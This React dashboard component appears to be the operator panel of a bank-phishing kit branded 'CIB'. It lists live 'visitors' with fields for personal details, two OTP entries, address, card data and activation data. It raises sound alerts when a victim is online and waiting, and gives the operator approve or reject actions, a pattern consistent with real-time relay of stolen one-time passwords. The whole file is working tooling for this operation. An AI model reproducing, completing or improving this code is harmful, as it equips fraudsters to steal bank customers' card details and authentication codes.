import { useState, useEffect, useRef } from "react";
import { Search, RefreshCw, Trash2, LogOut, BellRing, User, Volume2, VolumeX, Hourglass, Zap } from "lucide-react";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { supabase } from "@/integrations/supabase/client";
import { useToast } from "@/components/ui/use-toast";
import { useNotificationSound } from "@/hooks/use-notification-sound";
import UserDetailsPanel from "@/components/dashboard/UserDetailsPanel";
import type { Tables } from "@/integrations/supabase/types";

type DashboardUser = Tables<"dashboard_users">;

interface DashboardMainProps {
onLogout: () => void;
}

const DashboardMain = ({ onLogout }: DashboardMainProps) => {
const [users, setUsers] = useState<DashboardUser[]>([]);
const [searchTerm, setSearchTerm] = useState("");
const [statusFilter, setStatusFilter] = useState<"all" | "waiting" | "active" | "done">("all");
const [pageFilter, setPageFilter] = useState<string>("all");
const [completionFilter, setCompletionFilter] = useState<"all" | "new" | "partial" | "complete">("all");
const [selectedUser, setSelectedUser] = useState<DashboardUser | null>(null);
const [loading, setLoading] = useState(true);
const [unreadCount, setUnreadCount] = useState(0);
const [now, setNow] = useState(Date.now());
const [soundEnabled, setSoundEnabled] = useState(() => {
  const saved = localStorage.getItem("dashboard_sound");
  return saved !== "off";
});
const { toast } = useToast();
const { playNotification, playWaitingPing } = useNotificationSound();
const isInitialLoad = useRef(true);
const soundEnabledRef = useRef(soundEnabled);

useEffect(() => {
  soundEnabledRef.current = soundEnabled;
  localStorage.setItem("dashboard_sound", soundEnabled ? "on" : "off");
}, [soundEnabled]);

// ── helpers ──────────────────────────────────────────────────────────────
const sectionKeys = ["home_data", "message_data", "personal_data", "otp1_data", "otp2_data", "address_data", "card_data", "activation_data"] as const;

const getFilledCount = (u: DashboardUser) =>
  sectionKeys.filter((k) => { const d = u[k]; return d && !(Array.isArray(d) && (d as unknown[]).length === 0); }).length;

const isWaiting = (user: DashboardUser) => {
  const tabs = user.status_tabs as Record<string, string> | null;
  const action = tabs?.action || "";
  const processed = tabs?.processed === "true";
  if (processed) return false;
  if (action === "موافقة" || action === "رفض" || action === "بيانات خاطئة") return false;
  return action === "انتظار" || (!action);
};

const getElapsed = (updatedAt: string) => {
  const diff = Math.max(0, Math.floor((now - new Date(updatedAt).getTime()) / 1000));
  const h = Math.floor(diff / 3600);
  const m = Math.floor((diff % 3600) / 60);
  const s = diff % 60;
  if (h > 0) return `${h}س ${m}د`;
  if (m > 0) return `${m}د ${s}ث`;
  return `${s}ث`;
};

const isOnline = (updatedAt: string) => {
  const diff = (now - new Date(updatedAt).getTime()) / 1000;
  return diff < 300;
};

const getFlag = (code: string) => {
  if (!code || code.length !== 2) return "";
  return String.fromCodePoint(...[...code.toUpperCase()].map(c => 0x1F1E6 + c.charCodeAt(0) - 65));
};

const countryNames: Record<string, string> = {
  EG: "مصر", SA: "السعودية", AE: "الإمارات", KW: "الكويت", QA: "قطر",
  BH: "البحرين", OM: "عمان", JO: "الأردن", IQ: "العراق", LB: "لبنان",
  PS: "فلسطين", SY: "سوريا", LY: "ليبيا", SD: "السودان", TN: "تونس",
  DZ: "الجزائر", MA: "المغرب", YE: "اليمن", US: "أمريكا", GB: "بريطانيا",
  DE: "ألمانيا", FR: "فرنسا", TR: "تركيا",
};

// ── data fetching ─────────────────────────────────────────────────────────
const fetchUsers = async () => {
  setLoading(true);
  try {
    const { data, error } = await supabase
      .from("dashboard_users")
      .select("*")
      .order("updated_at", { ascending: false });

    if (error) throw error;
    setUsers((data || []) as DashboardUser[]);
  } catch (error) {
    console.error("[Dashboard] Failed to load users", error);
    toast({ title: "خطأ", description: "فشل في تحميل البيانات، اضغط تحديث للمحاولة مجددًا", variant: "destructive" });
  } finally {
    setLoading(false);
  }
};

// ── delete handlers ───────────────────────────────────────────────────────
const handleDeleteUser = async (id: string) => {
  const { error } = await supabase
    .from("dashboard_users")
    .delete()
    .eq("id", id);
  if (error) {
    toast({ title: "خطأ", description: "فشل في الحذف", variant: "destructive" });
  } else {
    toast({ title: "تم", description: "تم حذف المستخدم" });
    if (selectedUser?.id === id) setSelectedUser(null);
  }
};

const handleDeleteOffline = async () => {
  const offlineIds = users
    .filter((u) => !isOnline(u.updated_at))
    .map((u) => u.id);
  if (offlineIds.length === 0) {
    toast({ title: "تنبيه", description: "لا يوجد زوار غير متصلين" });
    return;
  }
  if (!confirm(`هل أنت متأكد من حذف ${offlineIds.length} زائر غير متصل؟`)) return;
  const { error } = await supabase
    .from("dashboard_users")
    .delete()
    .in("id", offlineIds);
  if (error) {
    toast({ title: "خطأ", description: "فشل في الحذف", variant: "destructive" });
  } else {
    toast({ title: "تم", description: `تم حذف ${offlineIds.length} زائر غير متصل` });
    if (selectedUser && offlineIds.includes(selectedUser.id)) setSelectedUser(null);
  }
};

const handleDeleteAll = async () => {
  if (users.length === 0) {
    toast({ title: "تنبيه", description: "لا يوجد بيانات للحذف" });
    return;
  }
  if (!confirm(`⚠️ هل أنت متأكد من مسح جميع البيانات؟ (${users.length} سجل)

هذا الإجراء لا يمكن التراجع عنه!`)) return;
  if (!confirm("تأكيد نهائي: سيتم حذف جميع السجلات نهائياً. هل تريد المتابعة؟")) return;
  const allIds = users.map((u) => u.id);
  const { error } = await supabase
    .from("dashboard_users")
    .delete()
    .in("id", allIds);
  if (error) {
    toast({ title: "خطأ", description: "فشل في مسح البيانات", variant: "destructive" });
  } else {
    toast({ title: "تم", description: "تم مسح جميع البيانات بنجاح" });
    setSelectedUser(null);
  }
};

// ── realtime + intervals ──────────────────────────────────────────────────
useEffect(() => {
  fetchUsers();

  const channel = supabase
    .channel("dashboard_users_changes")
    .on(
      "postgres_changes",
      { event: "*", schema: "public", table: "dashboard_users" },
      (payload) => {
        if (payload.eventType === "INSERT") {
          setUsers((prev) => [payload.new as DashboardUser, ...prev]);
          if (!isInitialLoad.current && soundEnabledRef.current) playNotification();
          setUnreadCount((c) => c + 1);
        } else if (payload.eventType === "UPDATE") {
          setUsers((prev) =>
            prev.map((u) => (u.id === payload.new.id ? (payload.new as DashboardUser) : u))
          );
        } else if (payload.eventType === "DELETE") {
          setUsers((prev) => prev.filter((u) => u.id !== payload.old.id));
        }
      }
    )
    .subscribe();

  isInitialLoad.current = false;

  return () => {
    supabase.removeChannel(channel);
  };
}, []);

useEffect(() => {
  const interval = setInterval(() => setNow(Date.now()), 1000);
  return () => clearInterval(interval);
}, []);

useEffect(() => {
  const interval = setInterval(() => {
    if (!soundEnabledRef.current) return;
    const hasWaitingOnline = users.some((u) => isWaiting(u) && isOnline(u.updated_at));
    if (hasWaitingOnline) playWaitingPing();
  }, 20000);
  return () => clearInterval(interval);
}, [users]);

// ── derived state ─────────────────────────────────────────────────────────
const waitingCount = users.filter((u) => isWaiting(u)).length;
const uniquePages = [...new Set(users.map((u) => u.last_page).filter(Boolean))] as string[];

const filteredUsers = users
  .filter((u) => {
    if (!u.name.toLowerCase().includes(searchTerm.toLowerCase()) && !u.name.includes(searchTerm)) return false;
    if (statusFilter === "waiting") { if (!isWaiting(u)) return false; }
    else if (statusFilter === "active") { if (isWaiting(u) || u.last_page === "النجاح" || u.last_page === "تم") return false; }
    else if (statusFilter === "done") { if (u.last_page !== "النجاح" && u.last_page !== "تم") return false; }
    if (pageFilter !== "all" && u.last_page !== pageFilter) return false;
    if (completionFilter !== "all") {
      const filled = getFilledCount(u);
      if (completionFilter === "new" && filled > 1) return false;
      if (completionFilter === "partial" && (filled <= 1 || filled >= sectionKeys.length)) return false;
      if (completionFilter === "complete" && filled < sectionKeys.length) return false;
    }
    return true;
  })
  .sort((a, b) => {
    const aWaiting = isWaiting(a) && isOnline(a.updated_at);
    const bWaiting = isWaiting(b) && isOnline(b.updated_at);
    if (aWaiting && !bWaiting) return -1;
    if (!aWaiting && bWaiting) return 1;
    return new Date(b.updated_at).getTime() - new Date(a.updated_at).getTime();
  });

// ── render ────────────────────────────────────────────────────────────────
return (
  <div className="h-screen flex flex-col bg-background" dir="rtl">
    {/* Header */}
    <header className="hero-gradient px-4 py-3 flex items-center justify-between shrink-0 shadow-[0_2px_20px_hsl(213_76%_44%/0.3)] relative overflow-hidden">
      <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_50%_120%,hsl(250_60%_50%/0.3),transparent_60%)]" />
      <div className="flex items-center gap-3 relative z-10">
        <h1 className="text-lg font-extrabold text-primary-foreground">CIB</h1>
        <span className="text-sm font-bold text-primary-foreground/80">لوحة التحكم</span>
        {unreadCount > 0 && (
          <button onClick={() => setUnreadCount(0)} className="flex items-center gap-1 bg-primary-foreground/20 text-primary-foreground px-2 py-1 rounded-full text-[10px] font-bold animate-pulse backdrop-blur-sm">
            <BellRing className="w-3 h-3" />
            {unreadCount}
          </button>
        )}
      </div>
      <div className="flex items-center gap-2 relative z-10">
        <button
          onClick={() => setSoundEnabled((prev) => !prev)}
          className="w-8 h-8 rounded-lg flex items-center justify-center bg-primary-foreground/10 text-primary-foreground hover:bg-primary-foreground/20 transition-colors"
          title={soundEnabled ? "كتم الصوت" : "تشغيل الصوت"}
        >
          {soundEnabled ? <Volume2 className="w-4 h-4" /> : <VolumeX className="w-4 h-4 opacity-50" />}
        </button>
        <Button variant="secondary" size="sm" onClick={onLogout} className="text-xs bg-primary-foreground/10 text-primary-foreground border-primary-foreground/20 hover:bg-primary-foreground/20">
          <LogOut className="w-3.5 h-3.5 ml-1" /> خروج
        </Button>
      </div>
    </header>

    <div className="flex flex-1 overflow-hidden">
      {/* Sidebar - Visitor Cards */}
      <div className={`${selectedUser ? "hidden md:flex w-80" : "w-full max-w-md mx-auto"} flex flex-col border-l border-border bg-card shrink-0 transition-all`}>
        {/* Search & Filters */}
        <div className="p-3 border-b border-border space-y-2">
          <div className="relative">
            <Search className="absolute right-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-muted-foreground" />
            <Input placeholder="بحث..." value={searchTerm} onChange={(e) => setSearchTerm(e.target.value)} className="pr-9 text-right text-xs h-8" />
          </div>
          <div className="flex gap-1 flex-wrap">
            {([
              { key: "all" as const, label: `الكل (${users.length})` },
              { key: "waiting" as const, label: `⏳ (${waitingCount})` },
              { key: "active" as const, label: "🔵 نشط" },
              { key: "done" as const, label: "✅ منتهي" },
            ]).map((f) => (
              <Button key={f.key} size="sm" variant={statusFilter === f.key ? "default" : "outline"} onClick={() => setStatusFilter(f.key)} className="text-[10px] px-2 h-6">
                {f.label}
              </Button>
            ))}
            <div className="mr-auto flex gap-1">
              <Button variant="outline" size="sm" onClick={fetchUsers} className="text-[10px] h-6 px-2"><RefreshCw className="w-3 h-3" /></Button>
              <Button variant="destructive" size="sm" onClick={handleDeleteOffline} className="text-[10px] h-6 px-2" title="حذف غير المتصلين"><Trash2 className="w-3 h-3" /></Button>
              <Button variant="destructive" size="sm" onClick={handleDeleteAll} className="text-[10px] h-6 px-2" title="مسح جميع البيانات">🗑️ مسح الكل</Button>
            </div>
          </div>
          {/* Page Filter */}
          <div className="flex gap-1 flex-wrap">
            <span className="text-[9px] text-muted-foreground self-center ml-1">الصفحة:</span>
            <Button size="sm" variant={pageFilter === "all" ? "default" : "outline"} onClick={() => setPageFilter("all")} className="text-[9px] px-1.5 h-5">الكل</Button>
            {uniquePages.map((p) => (
              <Button key={p} size="sm" variant={pageFilter === p ? "default" : "outline"} onClick={() => setPageFilter(p)} className="text-[9px] px-1.5 h-5 truncate max-w-[80px]">
                {p}
              </Button>
            ))}
          </div>
          {/* Completion Filter */}
          <div className="flex gap-1 flex-wrap">
            <span className="text-[9px] text-muted-foreground self-center ml-1">الاكتمال:</span>
            {([
              { key: "all" as const, label: "الكل" },
              { key: "new" as const, label: "🆕 جديد" },
              { key: "partial" as const, label: "📊 جزئي" },
              { key: "complete" as const, label: "✅ مكتمل" },
            ]).map((f) => (
              <Button key={f.key} size="sm" variant={completionFilter === f.key ? "default" : "outline"} onClick={() => setCompletionFilter(f.key)} className="text-[9px] px-1.5 h-5">
                {f.label}
              </Button>
            ))}
          </div>
        </div>

        {/* User Cards List */}
        <div className="flex-1 overflow-y-auto p-2 space-y-2">
          {loading ? (
            <div className="text-center py-8 text-muted-foreground text-sm">جاري التحميل...</div>
          ) : filteredUsers.length === 0 ? (
            <div className="text-center py-8 text-muted-foreground text-sm">لا يوجد زوار</div>
          ) : (
            filteredUsers.map((user) => {
              const waiting = isWaiting(user);
              const isSelected = selectedUser?.id === user.id;
              const filled = getFilledCount(user);
              const pct = Math.round((filled / sectionKeys.length) * 100);
              const online = isOnline(user.updated_at);
              const cc = (user as any).country_code || "";
              const flag = getFlag(cc);
              const country = countryNames[cc.toUpperCase()] || cc;
              const urgent = waiting && online;
              const waitSec = Math.max(0, Math.floor((now - new Date(user.updated_at).getTime()) / 1000));
              const longWait = urgent && waitSec >= 60;
              return (
                <button
                  key={user.id}
                  onClick={() => setSelectedUser(user)}
                  className={`w-full text-right p-3 rounded-xl border-2 transition-colors relative overflow-hidden ${
                    isSelected ? "bg-primary/5 !border-primary" : "border-border/60"
                  } ${
                    urgent
                      ? `bg-gradient-to-l from-amber-50 via-orange-50 to-amber-50 ${longWait ? "!border-red-500 animate-waiting-urgent" : "!border-amber-500 animate-waiting-pulse"}`
                      : !online
                        ? "opacity-50 bg-muted/30"
                        : "hover:bg-muted/50"
                  }`}
                  style={{ contain: "layout paint" }}
                >
                  {urgent && (
                    <div className="pointer-events-none absolute inset-0 overflow-hidden rounded-xl">
                      <div className="absolute inset-y-0 -left-1/3 w-1/3 bg-gradient-to-r from-transparent via-white/40 to-transparent animate-waiting-shimmer" />
                    </div>
                  )}
                  {urgent && (
                    <div className={`absolute top-0 bottom-0 left-0 w-1 ${longWait ? "bg-red-500" : "bg-amber-500"} animate-pulse`} />
                  )}
                  {urgent && (
                    <div className={`absolute top-0 right-0 w-0 h-0 ${longWait ? "border-t-red-500" : "border-t-amber-500"} border-t-[28px] border-l-[28px] border-l-transparent`} />
                  )}
                  {urgent && (
                    <Hourglass className={`absolute top-1 right-1 w-3 h-3 ${longWait ? "text-white" : "text-white"} animate-spin-slow z-10`} />
                  )}

                  <div className="flex items-center gap-3 relative z-[1]">
                    <div className="relative shrink-0">
                      {urgent && (
                        <span className={`absolute inset-0 rounded-full ${longWait ? "bg-red-400/40" : "bg-amber-400/40"} animate-ping`} />
                      )}
                      <div className={`relative w-9 h-9 rounded-full flex items-center justify-center text-sm font-bold ${
                        urgent
                          ? longWait
                            ? "bg-red-100 text-red-700 ring-2 ring-red-400"
                            : "bg-amber-100 text-amber-700 ring-2 ring-amber-400"
                          : "bg-primary/10 text-primary"
                      }`}>
                        {user.name.charAt(0)}
                      </div>
                      <div className={`absolute -bottom-0.5 -left-0.5 w-3 h-3 rounded-full border-2 border-card ${
                        online ? "bg-green-500" : "bg-muted-foreground/40"
                      }`} />
                    </div>
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center justify-between gap-2">
                        <div className="flex items-center gap-1.5 min-w-0">
                          <span className={`text-xs font-bold truncate ${urgent ? (longWait ? "text-red-800" : "text-amber-900") : "text-foreground"}`}>{user.name}</span>
                          {flag && <span className="text-sm shrink-0" title={country}>{flag}</span>}
                        </div>
                        <div className="flex items-center gap-1.5 shrink-0">
                          <span className={`text-[8px] px-1 py-0.5 rounded ${online ? "bg-green-100 text-green-700" : "bg-muted text-muted-foreground"}`}>
                            {online ? "متصل" : `آخر ظهور ${getElapsed(user.updated_at)}`}
                          </span>
                        </div>
                      </div>
                      <div className="flex items-center justify-between gap-2 mt-0.5">
                        <div className="flex items-center gap-1.5 min-w-0">
                          <span className="text-[10px] font-bold px-2 py-0.5 rounded-md bg-primary/10 text-primary border border-primary/20 truncate">
                            📄 {user.last_page || "غير محدد"}
                          </span>
                        </div>
                        {urgent && (
                          <span className={`flex items-center gap-1 text-[9px] px-1.5 py-0.5 rounded-full font-bold border shrink-0 ${
                            longWait
                              ? "bg-red-500 text-white border-red-600 animate-pulse shadow-[0_0_10px_hsl(0_84%_60%/0.7)]"
                              : "bg-amber-500 text-white border-amber-600 animate-pulse shadow-[0_0_8px_hsl(38_92%_50%/0.6)]"
                          }`}>
                            {longWait ? <Zap className="w-2.5 h-2.5" /> : <Hourglass className="w-2.5 h-2.5 animate-spin-slow" />}
                            {longWait ? `عاجل · ${getElapsed(user.updated_at)}` : `ينتظر · ${getElapsed(user.updated_at)}`}
                          </span>
                        )}
                      </div>
                      <div className="flex items-center gap-1.5 mt-1">
                        <div className="flex-1 h-1 bg-muted rounded-full overflow-hidden">
                          <div className={`h-full rounded-full transition-all ${pct === 100 ? "bg-green-500" : pct >= 50 ? "bg-primary" : "bg-amber-400"}`} style={{ width: `${pct}%` }} />
                        </div>
                        <span className="text-[8px] text-muted-foreground">{filled}/{sectionKeys.length}</span>
                      </div>
                      {urgent && (
                        <div className={`mt-1.5 text-[9px] font-bold flex items-center gap-1 ${longWait ? "text-red-700" : "text-amber-700"}`}>
                          <span className="inline-block w-1.5 h-1.5 rounded-full bg-current animate-pulse" />
                          {longWait ? "بحاجة إجراء فوري — قبول / رفض" : "بانتظار قرار: موافقة أو رفض"}
                        </div>
                      )}
                    </div>
                  </div>
                </button>
              );
            })
          )}
        </div>
      </div>

      {/* Detail Panel */}
      {selectedUser && (
        <div className="fixed inset-0 z-50 md:static md:z-auto md:flex-1 overflow-hidden">
          <UserDetailsPanel
            user={selectedUser}
            onClose={() => setSelectedUser(null)}
            onDelete={() => handleDeleteUser(selectedUser.id)}
          />
        </div>
      )}

      {/* Empty state */}
      {!selectedUser && users.length > 0 && (
        <div className="flex-1 hidden md:flex items-center justify-center">
          <div className="text-center text-muted-foreground">
            <User className="w-12 h-12 mx-auto mb-3 opacity-30" />
            <p className="text-sm">اختر زائراً لعرض تفاصيله</p>
          </div>
        </div>
      )}
    </div>
  </div>
);
};

export default DashboardMain;
